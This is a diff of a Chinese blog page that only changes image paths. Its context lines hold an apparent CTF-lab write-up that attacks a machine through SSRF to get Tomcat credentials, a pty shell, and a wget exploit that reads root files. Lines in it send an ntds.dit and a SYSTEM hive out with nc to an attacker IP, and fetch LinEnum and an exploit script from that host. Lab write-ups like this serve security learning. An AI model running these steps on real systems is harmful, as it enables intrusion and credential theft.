@@ -270,7 +270,7 @@
 <p>客户端（去扫描B服务器 ！）——》A服务端（执行）————》B服务器（返回数据包）————》A服务器（执行完毕）————》客户端（收到扫描结果）</p>
 </blockquote>
 <p>服务器没有过滤客户端的请求。本来设计的功能想法是好的，但是攻击者不打算<strong>以设计者的想法</strong>来使用这个功能。</p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/05-25-07/1.PNG" srcset="/img/loading.gif" alt="1"></p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/1.PNG" srcset="/img/loading.gif" alt="1"></p>
 <figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">使用这个私人的web浏览器匿名在网络冲浪，请不要滥用它。<br></code></pre></div></td></tr></table></figure>
 <ul>
 <li><p>Trying</p>
@@ -295,7 +295,7 @@
 </li>
 </ul>
 <p><code>http://10.10.10.55:60000/url.php?path=http://localhost:888/?doc=backup</code></p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/05-25-07/7.PNG" srcset="/img/loading.gif" alt="7"></p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/7.PNG" srcset="/img/loading.gif" alt="7"></p>
 <p>得到了可能是tomcat配置文件中的用户名密码。</p>
 <p>（有一个小技巧，在端口扫描那一步，得到了不能访问的文件名，可以用ssrf去访问，来获取敏感文件。）</p>
 <p>我们用这个口令登陆端口扫描那一步获得的地址<code>manager/html</code></p>
@@ -315,19 +315,19 @@
 <li>shell中运行</li>
 </ul>
 <p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code> 于是获得一个bash shell。</p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/05-25-07/12.PNG" srcset="/img/loading.gif" alt="12"></p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/12.PNG" srcset="/img/loading.gif" alt="12"></p>
 <ul>
 <li>find . -name “user.txt” 2&gt;/dev/null<br><code>/home/atanas/user.txt</code> 无读取选项</li>
 </ul>
 <h2 id="用户提权"><a href="#用户提权" class="headerlink" title="用户提权"></a>用户提权</h2><p>经过之前步骤，我们获得了一个tomcat用户权限的shell，可以看到有一些文件是不允许访问的。接下来看看如何获取root权限。</p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/05-25-07/8.PNG" srcset="/img/loading.gif"></p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/8.PNG" srcset="/img/loading.gif"></p>
 <p><code>cd /home/tomcat/to_archive/pentest_data</code></p>
 <p>在用户家目录下，发现一个ntds.dit文件。以前没做过域渗透，(⊙﹏⊙)稍微去了解了下，ntds.dit即目录数据库，用于windows域。</p>
 <h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>将那两个文件用nc发送到攻击机本地</p>
 <figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">kali</span>:   nc -lvnp <span class="hljs-number">443</span> &gt; SYSTEM<br><span class="hljs-attribute">shell</span>:  nc <span class="hljs-number">10.10.14.5</span> <span class="hljs-number">443</span> &lt;  <span class="hljs-number">20170721114637</span>_default_<span class="hljs-number">192.168.110.133</span>_psexec.ntdsgrab._<span class="hljs-number">089134</span>.bin<br><span class="hljs-attribute">kali</span>:   file<br></code></pre></div></td></tr></table></figure>
 <p>同样的方式，把另一个文件用ntds.dit作为文件名传送到本地</p>
 <h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>发现nc传输，当文件大时，十分不方便</p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/05-25-07/2.PNG" srcset="/img/loading.gif" alt="2"></p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/2.PNG" srcset="/img/loading.gif" alt="2"></p>
 <p>远程shell：python -m SimpleHTTPServer 7788<br>本地kali：</p>
 <figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://<span class="hljs-number">10.10.10.55:7788</span>/<span class="hljs-number">20170721114637</span>_default_<span class="hljs-number">192.168.110.133</span>_psexec.ntdsgrab._<span class="hljs-number">089134</span>.bin<br><span class="hljs-attribute">wget</span> http://<span class="hljs-number">10.10.10.55:7788</span>/<span class="hljs-number">20170721114636</span>_default_<span class="hljs-number">192.168.110.133</span>_psexec.ntdsgrab._<span class="hljs-number">333512</span>.dit<br></code></pre></div></td></tr></table></figure>
 <h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>简而言之，下面的工具就是用来提取目录数据库中保存的hash的。</p>
@@ -362,9 +362,9 @@
 <h2 id="root提权"><a href="#root提权" class="headerlink" title="root提权"></a>root提权</h2><p>kali：<code>python -m SimpleHTTPServer 80</code></p>
 <p>远程shell: </p>
 <figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">cd /tmp<br>wget http:<span class="hljs-comment">//10.10.14.5:80/LinEnum.sh</span><br>chmod a+x <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LinEnum</span>.</span></span>sh; ./<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LinEnum</span>.</span></span>sh<br></code></pre></div></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/05-25-07/3.PNG" srcset="/img/loading.gif" alt="3"></p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/3.PNG" srcset="/img/loading.gif" alt="3"></p>
 <p>find . -name “root.txt” 2&gt;/dev/null<br>未找到</p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/05-25-07/4.PNG" srcset="/img/loading.gif" alt="4"></p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/4.PNG" srcset="/img/loading.gif" alt="4"></p>
 <h3 id="线索app-log"><a href="#线索app-log" class="headerlink" title="线索app.log"></a>线索app.log</h3><p>app.log暗示了我们10.0.3.133的wget版本<code>Wget/1.16</code></p>
 <p><code>wget -V</code>，发现主机10.10.10.55的Wget版本为 <code>1.17.1</code></p>
 <p>有一个主机10.0.3.133，每两分钟获取主机10.10.10.55的/archive.tar.gz文件。</p>
@@ -390,8 +390,8 @@
 <p>kali上传wget.py到远程主机：<br><code>python -m SimpleHTTPServer 8080</code></p>
 <p>远程shell :</p>
 <figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">wget http://<span class="hljs-number">10.10</span>.<span class="hljs-number">14.5</span>:<span class="hljs-number">8080</span>/wget.<span class="hljs-keyword">py</span><br>authbind <span class="hljs-keyword">python</span> wget.<span class="hljs-keyword">py</span><br></code></pre></div></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/05-25-07/5.PNG" srcset="/img/loading.gif" alt="5"></p>
-<p>稍等两分钟，10.10.10.55的shell就会返回执行结果，成功获得10.10.3.133的/root/root.txt文件。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/05-25-07/6.PNG" srcset="/img/loading.gif" alt="6"></p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/5.PNG" srcset="/img/loading.gif" alt="5"></p>
+<p>稍等两分钟，10.10.10.55的shell就会返回执行结果，成功获得10.10.3.133的/root/root.txt文件。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-25-07/6.PNG" srcset="/img/loading.gif" alt="6"></p>
 <p>如果将.wgetrc文件进行修改，即可获得任意10.10.3.133的文件，包括/etc/shadow。</p>
 <h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料:"></a>参考资料:</h3><p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/3-ways-extract-password-hashes-from-ntds-dit/">从ntds-dit提取密码的三种方式</a></p>
 
